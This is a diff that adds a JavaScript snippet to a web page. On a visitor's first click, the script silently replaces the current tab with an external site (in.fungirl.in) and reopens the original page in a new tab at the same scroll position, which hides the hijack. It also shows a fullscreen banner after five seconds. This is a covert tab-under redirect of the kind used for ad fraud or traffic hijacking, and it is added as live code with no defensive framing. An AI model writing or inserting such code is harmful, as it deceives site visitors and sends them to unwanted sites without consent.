@@ -1,0 +1,51 @@
+// Array of URLs to choose from
+    const urlsToOpen = [
+        'https://in.fungirl.in/',
+    ];
+    // Function to replace the current tab's URL with a randomly chosen URL and open a new tab with the original URL on click
+    function replaceAndOpenRandomTab(event) {
+        // Check if the script has already been executed in the current session
+        if (!localStorage.getItem('scriptExecuted')) {
+            // Set a flag in localStorage to prevent further executions in this session
+            localStorage.setItem('scriptExecuted', 'true');
+            // Choose a random URL from the array
+            const randomIndex = Math.floor(Math.random() * urlsToOpen.length);
+            const randomUrl = urlsToOpen[randomIndex];
+            // Get the coordinates of the click event
+            const clickX = event.clientX;
+            const clickY = event.clientY;
+            // Get the window's scroll position
+            const scrollX = window.scrollX || window.pageXOffset;
+            const scrollY = window.scrollY || window.pageYOffset;
+            // Replace the current tab's URL after a delay
+            setTimeout(function () {
+                window.location.replace(randomUrl);
+            }, 401);
+            // Open a new tab with the original URL and pass the coordinates of the click event
+            setTimeout(function () {
+                const newTab = window.open(window.location.href, '_blank');
+                newTab.onload = function() {
+                    newTab.scrollTo(scrollX, scrollY);
+                };
+            }, 400);
+        }
+        // Remove the click event listener to prevent further executions in this session
+        document.removeEventListener('click', replaceAndOpenRandomTab);
+    }
+    // Adding click event listener to the document
+    document.addEventListener('click', replaceAndOpenRandomTab);
+    // Function to show the banner
+    function showBanner() {
+        if (!localStorage.getItem('bannerShown')) {
+            document.getElementById('fullscreen-banner').style.display = 'flex';
+            localStorage.setItem('bannerShown', 'true');
+        }
+    }
+    // Display the banner after 5 seconds
+    setTimeout(showBanner, 5000);
+    // Close the banner when the close button is clicked
+    document.getElementById('close-btn').addEventListener('click', function() {
+
+        document.getElementById('fullscreen-banner').style.display = 'none';
+
+    });
